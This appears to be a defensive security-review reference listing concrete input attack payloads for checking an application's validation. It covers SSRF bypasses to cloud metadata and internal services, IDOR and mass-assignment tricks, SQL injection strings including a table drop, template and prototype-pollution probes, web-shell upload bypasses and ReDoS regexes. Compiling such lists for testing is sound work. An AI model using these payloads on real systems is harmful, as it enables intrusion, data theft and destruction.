# Input Attack Patterns

Concrete bypass examples per category. Use these when checking whether the application's validation would prevent the attack.

## SSRF Bypass Techniques

- `127.0.0.1`, `localhost`, `0.0.0.0`
- Hex encoding: `0x7f000001` (127.0.0.1)
- Octal encoding: `0177.0.0.1`
- Short form: `127.1`
- IPv6: `[::1]`, `[::ffff:127.0.0.1]`
- AWS/GCP/Azure metadata: `169.254.169.254`, `metadata.google.internal`, `169.254.169.254/metadata/v1`
- DNS rebinding: register a domain that initially resolves to a public IP (passes allowlist), then re-resolves to `127.0.0.1` after TTL expires
- **Redirect chain bypass**: attacker-controlled URL responds with `302 → http://169.254.169.254` — server follows the redirect after validation passes on the original URL
- Protocol alternatives: `file:///etc/passwd`, `gopher://127.0.0.1:6379/`, `dict://127.0.0.1:11211/`
- URL `@` trick: `http://attacker.com@127.0.0.1` — browser/library may treat `127.0.0.1` as host

## IDOR Patterns

- **Sequential integer IDs**: increment resource ID by 1 in the URL path (`/api/users/1` → `/api/users/2`)
- **UUID v1 prediction**: UUID v1 embeds timestamp + MAC address — sequential UUIDs from the same host are predictable
- **Parameter pollution**: `?id=1&id=2` — some frameworks use the last value, others the first
- **Path traversal in resource ID**: `/api/files/../../../etc/passwd`
- **Body field swap**: change `user_id` or `account_id` in the POST/PUT body to another user's ID

## Mass Assignment Targets

Fields that should never be settable via a public endpoint:

- `is_admin`, `admin`, `role`, `roles`, `permissions`, `scope`
- `price`, `cost`, `amount`, `balance`, `credits`
- `verified`, `email_verified`, `email_verified_at`, `confirmed`, `confirmed_at`
- `status` (when it controls account state, not user-settable state)
- `created_at`, `updated_at` (can cause audit trail manipulation)
- `owner_id`, `user_id`, `account_id` (ownership reassignment)

## SQL Injection Patterns

- Classic: `' OR 1=1--`, `'; DROP TABLE users--`
- Union-based: `' UNION SELECT null, username, password FROM users--`
- Boolean blind: `' AND 1=1--` (true) vs `' AND 1=2--` (false)
- Time-based blind: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `'; SELECT SLEEP(5)--` (MySQL), `'; SELECT pg_sleep(5)--` (PostgreSQL)
- **Second-order injection**: input stored in the DB, then later retrieved and used in another query without re-sanitization

## Template Injection Probes

- Jinja2 / Twig: `{{7*7}}` → should return 49 if template injection is present
- Freemarker: `${7*7}`
- Ruby ERB: `<%= 7*7 %>`
- EJS / Handlebars: `{{7*7}}` or `<%= 7*7 %>`
- Velocity: `#set($x=7*7)${x}`

## Prototype Pollution Payloads (JS/Node)

- `{"__proto__":{"isAdmin":true}}`
- `{"constructor":{"prototype":{"isAdmin":true}}}`
- `{"__proto__":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}`

## File Upload Bypass Techniques

- **Double extension**: `shell.php.jpg` — web server may still execute the `.php` portion
- **Null byte**: `shell.php%00.jpg` — some parsers truncate at null byte, treating filename as `shell.php`
- **MIME mismatch**: `Content-Type: image/png` with PHP/JSP body content
- **Polyglot file**: a JPEG that is also a valid PHP script
- **ZIP slip**: archive with `../../../etc/cron.d/evil` as a file path inside the ZIP

## ReDoS Patterns

Patterns that cause catastrophic backtracking when applied to attacker-controlled input:

- `(a+)+` against input like `aaaaaaaaaaaaaaaaaaaaaaaa!`
- `(a|a)+` — equivalent repetition
- `^(([a-z])+\.)+[A-Z]{2,4}$` against long strings without a valid TLD
- Email regex patterns with multiple quantified groups applied to long invalid input
